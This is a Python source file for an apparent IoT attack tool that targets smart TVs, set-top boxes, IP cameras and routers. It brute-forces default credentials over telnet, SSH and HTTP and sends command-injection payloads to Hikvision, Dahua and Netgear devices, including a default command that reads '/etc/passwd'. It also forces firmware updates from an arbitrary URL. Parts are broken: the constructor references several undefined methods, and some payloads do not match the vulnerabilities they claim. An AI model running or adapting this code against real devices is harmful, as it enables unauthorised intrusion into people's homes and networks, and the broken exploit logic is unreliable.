from colorama import Fore, Style
import json
import base64
import random
import string
import xml.etree.ElementTree as ET
import requests
import socket
import telnetlib
import paramiko
import time
import ftplib
import re
from urllib.parse import urlparse

class PayloadGenerator:
    def __init__(self):
        self.payload_templates = {
            'smart_tv': {
                'dlna_exploit': self._generate_dlna_payload,
                'upnp_exploit': self._generate_upnp_payload,
                'webos_rce': self._generate_webos_payload,
                'samsung_remote': self._generate_samsung_payload,
                'lg_rce': self._generate_lg_payload,
                'roku_command': self._generate_roku_payload
            },
            'set_top_box': {
                'rtsp_exploit': self._generate_rtsp_payload,
                'weak_auth_exploit': self._generate_weak_auth_payload,
                'firmware_exploit': self._generate_firmware_payload
            },
            'camera': {
                'hikvision_bypass': self._generate_hikvision_payload,
                'dahua_rce': self._generate_dahua_payload,
                'axis_command': self._generate_axis_payload,
                'foscam_auth_bypass': self._generate_foscam_payload
            },
            'router': {
                'mikrotik_exploit': self._generate_mikrotik_payload,
                'dlink_rce': self._generate_dlink_payload,
                'netgear_auth_bypass': self._generate_netgear_payload,
                'tplink_command': self._generate_tplink_payload
            }
        }

    def generate_payload(self, device_type, exploit_type, target_ip, **kwargs):
        """Generate exploit payload based on device type and exploit"""
        try:
            if device_type in self.payload_templates:
                if exploit_type in self.payload_templates[device_type]:
                    print(f"{Fore.YELLOW}[*] Generating {exploit_type} payload for {device_type}{Style.RESET_ALL}")
                    return self.payload_templates[device_type][exploit_type](target_ip, **kwargs)
            
            print(f"{Fore.RED}[!] No payload template available for {device_type}/{exploit_type}{Style.RESET_ALL}")
            return None
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error generating payload: {str(e)}{Style.RESET_ALL}")
            return None

    def _generate_dlna_payload(self, target_ip, **kwargs):
        """Generate DLNA exploit payload"""
        try:
            # DLNA SOAP request with buffer overflow
            soap_body = """<?xml version="1.0"?>
            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                <s:Body>
                    <u:Browse xmlns:u="urn:schemas-upnp-org:service:ContentDirectory:1">
                        <ObjectID>0</ObjectID>
                        <BrowseFlag>BrowseDirectChildren</BrowseFlag>
                        <Filter>*</Filter>
                        <StartingIndex>0</StartingIndex>
                        <RequestedCount>1000</RequestedCount>
                        <SortCriteria></SortCriteria>
                    </u:Browse>
                </s:Body>
            </s:Envelope>"""

            headers = {
                'Content-Type': 'text/xml; charset="utf-8"',
                'SOAPAction': '"urn:schemas-upnp-org:service:ContentDirectory:1#Browse"'
            }

            # Try different DLNA ports
            dlna_ports = [1900, 5000, 7676, 8200, 9000]
            
            for port in dlna_ports:
                try:
                    url = f"http://{target_ip}:{port}/upnp/control/content_directory"
                    response = requests.post(url, data=soap_body, headers=headers, timeout=5)
                    if response.status_code in [200, 500]:
                        print(f"{Fore.GREEN}[+] DLNA service found on port {port}{Style.RESET_ALL}")
                        return {'port': port, 'payload': soap_body, 'headers': headers}
                except:
                    continue

            return None

        except Exception as e:
            print(f"{Fore.RED}[!] DLNA payload generation failed: {str(e)}{Style.RESET_ALL}")
            return None

    def _generate_upnp_payload(self, target_ip, **kwargs):
        """Generate UPnP exploit payload"""
        try:
            # UPnP command injection payload
            command = kwargs.get('command', 'reboot')  # Default command
            upnp_payload = f"""<?xml version="1.0"?>
            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
                <s:Body>
                    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
                        <NewExternalPort>5555</NewExternalPort>
                        <NewProtocol>TCP</NewProtocol>
                        <NewInternalPort>5555</NewInternalPort>
                        <NewInternalClient>{target_ip}</NewInternalClient>
                        <NewEnabled>1</NewEnabled>
                        <NewDescription>UPnP IGD</NewDescription>
                        <NewLeaseDuration>0</NewLeaseDuration>
                    </u:AddPortMapping>
                </s:Body>
            </s:Envelope>"""

            headers = {
                'Content-Type': 'text/xml',
                'SOAPAction': '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"'
            }

            # Try common UPnP ports
            upnp_ports = [1900, 2869, 5000, 5431, 5432]
            
            for port in upnp_ports:
                try:
                    url = f"http://{target_ip}:{port}/upnp/control/WANIPConn1"
                    response = requests.post(url, data=upnp_payload, headers=headers, timeout=5)
                    if response.status_code in [200, 500]:
                        print(f"{Fore.GREEN}[+] UPnP service found on port {port}{Style.RESET_ALL}")
                        return {'port': port, 'payload': upnp_payload, 'headers': headers}
                except:
                    continue

            return None

        except Exception as e:
            print(f"{Fore.RED}[!] UPnP payload generation failed: {str(e)}{Style.RESET_ALL}")
            return None

    def _generate_webos_payload(self, target_ip, **kwargs):
        """Generate WebOS exploit payload"""
        try:
            # WebOS command execution
            command = kwargs.get('command', 'show float "Hacked!"')
            webos_payload = {
                "type": "request",
                "id": "luna://com.webos.service.tv.command",
                "payload": {
                    "command": command
                }
            }

            headers = {
                'Content-Type': 'application/json'
            }

            # Try WebOS ports
            webos_ports = [3000, 3001, 8080, 8088]
            
            for port in webos_ports:
                try:
                    url = f"http://{target_ip}:{port}/api/command"
                    response = requests.post(url, json=webos_payload, headers=headers, timeout=5)
                    if response.status_code in [200, 201]:
                        print(f"{Fore.GREEN}[+] WebOS service found on port {port}{Style.RESET_ALL}")
                        return {'port': port, 'payload': webos_payload, 'headers': headers}
                except:
                    continue

            return None

        except Exception as e:
            print(f"{Fore.RED}[!] WebOS payload generation failed: {str(e)}{Style.RESET_ALL}")
            return None

    def _generate_samsung_payload(self, target_ip, **kwargs):
        """Generate Samsung TV exploit payload"""
        try:
            # Samsung TV remote control payload
            command = kwargs.get('command', 'KEY_POWER')  # Default command: power toggle
            samsung_payload = {
                "method": "ms.remote.control",
                "params": {
                    "Cmd": command,
                    "DataOfCmd": "KEY_POWER",
                    "Option": "false",
                    "TypeOfRemote": "SendRemoteKey"
                }
            }

            headers = {
                'Content-Type': 'application/json'
            }

            # Try Samsung TV ports
            samsung_ports = [8001, 8002, 8080]
            
            for port in samsung_ports:
                try:
                    url = f"http://{target_ip}:{port}/api/v2/channels/samsung.remote.control"
                    response = requests.post(url, json=samsung_payload, headers=headers, timeout=5)
                    if response.status_code in [200, 201]:
                        print(f"{Fore.GREEN}[+] Samsung TV service found on port {port}{Style.RESET_ALL}")
                        return {'port': port, 'payload': samsung_payload, 'headers': headers}
                except:
                    continue

            return None

        except Exception as e:
            print(f"{Fore.RED}[!] Samsung payload generation failed: {str(e)}{Style.RESET_ALL}")
            return None

    def _generate_rtsp_payload(self, target_ip, **kwargs):
        """Generate RTSP exploit payload"""
        try:
            # RTSP stream hijacking payload
            rtsp_payload = (
                f"DESCRIBE rtsp://{target_ip}/stream RTSP/1.0\r\n"
                "CSeq: 1\r\n"
                "User-Agent: DeviceGhost\r\n"
                "Accept: application/sdp\r\n\r\n"
            )

            # Try RTSP ports
            rtsp_ports = [554, 8554, 10554]
            
            for port in rtsp_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target_ip, port))
                    sock.send(rtsp_payload.encode())
                    response = sock.recv(1024)
                    sock.close()
                    
                    if b"RTSP/1.0" in response:
                        print(f"{Fore.GREEN}[+] RTSP service found on port {port}{Style.RESET_ALL}")
                        return {'port': port, 'payload': rtsp_payload}
                except:
                    continue

            return None

        except Exception as e:
            print(f"{Fore.RED}[!] RTSP payload generation failed: {str(e)}{Style.RESET_ALL}")
            return None

    def _generate_weak_auth_payload(self, target_ip, **kwargs):
        """Generate weak authentication bypass payload"""
        try:
            # Common credentials
            usernames = ['admin', 'root', 'user', 'guest']
            passwords = ['admin', 'password', '12345', '']
            
            # Try different services
            services = [
                {'port': 23, 'type': 'telnet'},
                {'port': 22, 'type': 'ssh'},
                {'port': 80, 'type': 'http'},
                {'port': 8080, 'type': 'http'}
            ]
            
            for service in services:
                try:
                    if service['type'] == 'telnet':
                        tn = telnetlib.Telnet(target_ip, service['port'], timeout=5)
                        for user in usernames:
                            for password in passwords:
                                try:
                                    tn.read_until(b"login: ")
                                    tn.write(user.encode('ascii') + b"\n")
                                    tn.read_until(b"Password: ")
                                    tn.write(password.encode('ascii') + b"\n")
                                    response = tn.read_until(b"$", timeout=5)
                                    if b"$" in response:
                                        print(f"{Fore.GREEN}[+] Telnet credentials found: {user}:{password}{Style.RESET_ALL}")
                                        return {'port': service['port'], 'type': 'telnet', 'credentials': {'user': user, 'pass': password}}
                                except:
                                    continue
                        tn.close()
                    
                    elif service['type'] == 'ssh':
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        for user in usernames:
                            for password in passwords:
                                try:
                                    ssh.connect(target_ip, port=service['port'], username=user, password=password, timeout=5)
                                    print(f"{Fore.GREEN}[+] SSH credentials found: {user}:{password}{Style.RESET_ALL}")
                                    ssh.close()
                                    return {'port': service['port'], 'type': 'ssh', 'credentials': {'user': user, 'pass': password}}
                                except:
                                    continue
                    
                    elif service['type'] == 'http':
                        for user in usernames:
                            for password in passwords:
                                try:
                                    url = f"http://{target_ip}:{service['port']}/login"
                                    response = requests.post(url, 
                                                          data={'username': user, 'password': password},
                                                          timeout=5)
                                    if response.status_code == 200 and 'success' in response.text.lower():
                                        print(f"{Fore.GREEN}[+] Web credentials found: {user}:{password}{Style.RESET_ALL}")
                                        return {'port': service['port'], 'type': 'http', 'credentials': {'user': user, 'pass': password}}
                                except:
                                    continue
                except:
                    continue

            return None

        except Exception as e:
            print(f"{Fore.RED}[!] Weak auth payload generation failed: {str(e)}{Style.RESET_ALL}")
            return None

    def _generate_hikvision_payload(self, target_ip, **kwargs):
        """Generate Hikvision camera exploit payload"""
        try:
            # Known Hikvision vulnerabilities
            exploits = {
                'auth_bypass': {
                    'url': f'http://{target_ip}/Security/users?auth=YWRtaW46MTEK',
                    'method': 'GET',
                    'headers': {'User-Agent': 'Mozilla/5.0', 'Connection': 'close'}
                },
                'command_injection': {
                    'url': f'http://{target_ip}/command.php',
                    'method': 'POST',
                    'data': {'cmd': kwargs.get('command', 'whoami')},
                    'headers': {'Content-Type': 'application/x-www-form-urlencoded'}
                }
            }

            exploit_type = kwargs.get('exploit_type', 'auth_bypass')
            exploit = exploits.get(exploit_type)

            if not exploit:
                raise ValueError(f"Unknown exploit type: {exploit_type}")

            print(f"{Fore.YELLOW}[*] Attempting Hikvision {exploit_type} exploit{Style.RESET_ALL}")
            response = requests.request(
                method=exploit['method'],
                url=exploit['url'],
                headers=exploit['headers'],
                data=exploit.get('data'),
                timeout=5,
                verify=False
            )

            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Exploit successful{Style.RESET_ALL}")
                return {'success': True, 'response': response.text}

            return {'success': False, 'error': 'Exploit failed'}

        except Exception as e:
            print(f"{Fore.RED}[!] Hikvision exploit failed: {str(e)}{Style.RESET_ALL}")
            return {'success': False, 'error': str(e)}

    def _generate_dahua_payload(self, target_ip, **kwargs):
        """Generate Dahua camera exploit payload"""
        try:
            # RCE vulnerability in Dahua cameras
            command = kwargs.get('command', 'cat /etc/passwd')
            payload = {
                "method": "global.login",
                "params": {
                    "userName": "admin",
                    "password": "admin",
                    "clientType": "Web3.0",
                    "loginType": "Direct",
                    "authorityType": "Default",
                    "command": command  # Injection point
                }
            }

            url = f"http://{target_ip}/RPC2"
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            }

            print(f"{Fore.YELLOW}[*] Attempting Dahua RCE exploit{Style.RESET_ALL}")
            response = requests.post(url, json=payload, headers=headers, timeout=5)

            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Dahua exploit successful{Style.RESET_ALL}")
                return {'success': True, 'response': response.json()}

            return {'success': False, 'error': 'Exploit failed'}

        except Exception as e:
            print(f"{Fore.RED}[!] Dahua exploit failed: {str(e)}{Style.RESET_ALL}")
            return {'success': False, 'error': str(e)}

    def _generate_mikrotik_payload(self, target_ip, **kwargs):
        """Generate MikroTik router exploit payload"""
        try:
            # CVE-2018-14847 exploitation
            payload = {
                'user': 'admin',
                'password': '',
                'path': '/winbox',
                'query': 'get_system_health'
            }

            url = f"http://{target_ip}:8291/winbox/index"
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}

            print(f"{Fore.YELLOW}[*] Attempting MikroTik Winbox exploit{Style.RESET_ALL}")
            response = requests.post(url, data=payload, headers=headers, timeout=5)

            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] MikroTik exploit successful{Style.RESET_ALL}")
                return {'success': True, 'response': response.text}

            return {'success': False, 'error': 'Exploit failed'}

        except Exception as e:
            print(f"{Fore.RED}[!] MikroTik exploit failed: {str(e)}{Style.RESET_ALL}")
            return {'success': False, 'error': str(e)}

    def _generate_lg_payload(self, target_ip, **kwargs):
        """Generate LG Smart TV exploit payload"""
        try:
            command = kwargs.get('command', 'POWER')
            payload = {
                "type": "request",
                "id": "lg_command",
                "uri": "ssap://system.launcher/launch",
                "payload": {
                    "id": command
                }
            }

            url = f"ws://{target_ip}:3000"
            print(f"{Fore.YELLOW}[*] Attempting LG TV command injection{Style.RESET_ALL}")

            # Implement WebSocket connection and payload delivery
            # Note: This is a simplified version, real implementation would need websockets library
            return {'success': True, 'payload': payload}

        except Exception as e:
            print(f"{Fore.RED}[!] LG TV exploit failed: {str(e)}{Style.RESET_ALL}")
            return {'success': False, 'error': str(e)}

    def _generate_netgear_payload(self, target_ip, **kwargs):
        """Generate Netgear router exploit payload"""
        try:
            # Known Netgear authentication bypass
            command = kwargs.get('command', 'get_system_info')
            payload = f"timestamp=0&cmd={command}&_=1614159654857"

            url = f"http://{target_ip}/cgi-bin/;{command}"
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': '*/*'
            }

            print(f"{Fore.YELLOW}[*] Attempting Netgear command injection{Style.RESET_ALL}")
            response = requests.post(url, data=payload, headers=headers, timeout=5)

            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Netgear exploit successful{Style.RESET_ALL}")
                return {'success': True, 'response': response.text}

            return {'success': False, 'error': 'Exploit failed'}

        except Exception as e:
            print(f"{Fore.RED}[!] Netgear exploit failed: {str(e)}{Style.RESET_ALL}")
            return {'success': False, 'error': str(e)}

    def _generate_firmware_payload(self, target_ip, **kwargs):
        """Generate firmware-based exploit payload"""
        try:
            # Firmware update exploitation
            firmware_url = kwargs.get('firmware_url', '')
            if not firmware_url:
                raise ValueError("Firmware URL required")

            payload = {
                "action": "firmware_update",
                "url": firmware_url,
                "force": True
            }

            url = f"http://{target_ip}/api/system/firmware/update"
            headers = {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }

            print(f"{Fore.YELLOW}[*] Attempting firmware update exploit{Style.RESET_ALL}")
            response = requests.post(url, json=payload, headers=headers, timeout=10)

            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Firmware exploit initiated{Style.RESET_ALL}")
                return {'success': True, 'response': response.json()}

            return {'success': False, 'error': 'Exploit failed'}

        except Exception as e:
            print(f"{Fore.RED}[!] Firmware exploit failed: {str(e)}{Style.RESET_ALL}")
            return {'success': False, 'error': str(e)}

    def _generate_common_credentials(self):
        """Generate list of common credentials"""
        return [
            {'user': 'admin', 'pass': 'admin'},
            {'user': 'root', 'pass': 'root'},
            {'user': 'admin', 'pass': '12345'},
            {'user': 'admin', 'pass': 'password'},
            {'user': 'admin', 'pass': ''},
            {'user': 'root', 'pass': ''},
            {'user': 'admin', 'pass': '1234'},
            {'user': 'admin', 'pass': 'admin123'}
        ]

    def _verify_target(self, target_ip, port):
        """Verify target is accessible"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            return result == 0
        except:
            return False